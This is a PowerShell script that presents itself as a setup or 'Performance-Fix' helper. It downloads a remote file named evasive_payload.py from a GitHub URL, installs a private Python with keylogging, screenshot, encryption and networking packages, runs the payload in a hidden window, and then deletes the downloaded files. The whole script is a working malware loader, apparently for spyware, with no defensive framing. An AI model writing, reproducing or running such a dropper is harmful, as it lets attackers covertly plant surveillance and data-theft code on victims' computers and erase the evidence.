# setup.ps1 – Fully working with embeddable Python (site-packages enabled)
$ErrorActionPreference = "Continue"

$payloadUrl = "https://raw.githubusercontent.com/fortnite0712102-dot/Performance-Fix/refs/heads/main/evasive_payload.py"
$pythonZipUrl = "https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip"
$getPipUrl = "https://bootstrap.pypa.io/get-pip.py"

$tempDir = "$env:TEMP\py_setup"
New-Item -ItemType Directory -Force -Path $tempDir | Out-Null

Write-Host "[1] Downloading payload..."
Invoke-WebRequest -Uri $payloadUrl -OutFile "$env:TEMP\payload.py" -UseBasicParsing

Write-Host "[2] Downloading Python embed..."
Invoke-WebRequest -Uri $pythonZipUrl -OutFile "$tempDir\python.zip" -UseBasicParsing

Write-Host "[3] Extracting Python..."
Expand-Archive -Path "$tempDir\python.zip" -DestinationPath "$env:TEMP\python_embed" -Force

# Fix: enable site-packages by editing ._pth file
$pthFile = Get-ChildItem "$env:TEMP\python_embed\*._pth" | Select-Object -First 1
if ($pthFile) {
    Write-Host "[4] Enabling site-packages..."
    $content = Get-Content $pthFile.FullName -Raw
    $content = $content -replace '#import site', 'import site'
    Set-Content $pthFile.FullName $content -NoNewline
}

$pythonExe = "$env:TEMP\python_embed\python.exe"

Write-Host "[5] Installing pip..."
Invoke-WebRequest -Uri $getPipUrl -OutFile "$tempDir\get-pip.py" -UseBasicParsing
& $pythonExe "$tempDir\get-pip.py" --quiet --no-warn-script-location

Write-Host "[6] Installing packages..."
$packages = @("cryptography","pynput","mss","pillow","psutil","requests","numpy")
foreach ($pkg in $packages) {
    & $pythonExe -m pip install $pkg --quiet --disable-pip-version-check --no-warn-script-location --user
}

Write-Host "[7] Running payload..."
Start-Process -FilePath $pythonExe -ArgumentList "$env:TEMP\payload.py" -WindowStyle Hidden

Write-Host "[8] Cleaning up..."
Start-Sleep -Seconds 10
Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "$env:TEMP\python_embed" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "$env:TEMP\payload.py" -Force -ErrorAction SilentlyContinue

Write-Host "Done."